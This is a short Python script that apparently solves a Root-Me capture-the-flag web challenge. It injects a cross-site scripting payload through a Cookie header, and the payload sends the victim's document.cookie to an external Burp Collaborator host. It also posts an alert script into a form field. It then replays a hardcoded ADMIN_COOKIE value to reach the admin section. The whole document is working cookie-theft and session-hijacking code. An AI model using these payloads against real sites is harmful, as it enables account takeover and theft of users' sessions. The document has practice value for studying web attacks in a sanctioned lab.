import requests

url = 'http://challenge01.root-me.org/web-client/ch19/?section=admin'

headers = {"Content-Type":"application/x-www-form-urlencoded",
           "Cookie":'''"><script>document.location='http://llartngjebaflscnrijk19it2k8dw2.burpcollaborator.net?'.concat(document.cookie)</script>'''}


data = {"titre":"abc",
        "message":"<script>alert(1)</script>"}

x = requests.post(url,headers=headers,data=data)

headers = {
	"Cookie":"invite; ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F"
}

x = requests.get(url,headers=headers)
print(x.text)
